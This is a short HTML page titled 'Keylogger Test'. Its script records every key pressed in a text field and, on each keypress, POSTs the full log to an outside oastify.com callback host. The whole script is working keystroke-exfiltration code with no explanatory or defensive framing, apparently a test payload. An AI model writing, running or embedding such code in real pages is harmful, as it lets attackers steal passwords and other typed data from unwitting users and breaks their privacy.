<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger</title>
</head>
<body>
    <h1>Keylogger Test</h1>
    <input type="text" id="inputField" placeholder="Start typing...">

    <script>
        const inputField = document.getElementById('inputField');

        // Create an array to store key presses
        let keyLogs = [];

        // Capture key press event
        inputField.addEventListener('keydown', (event) => {
            const key = event.key; // Get the key that was pressed
            keyLogs.push(key); // Store the keypress

            // Send the key logs to your server via the proxy server
            fetch('https://7goeirjdur54q94kpct0r4sbo2util6a.oastify.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ keys: keyLogs })
            })
            .then(response => response.json())
            .catch(error => console.error('Error sending keystrokes:', error));
        });
    </script>
</body>
</html>
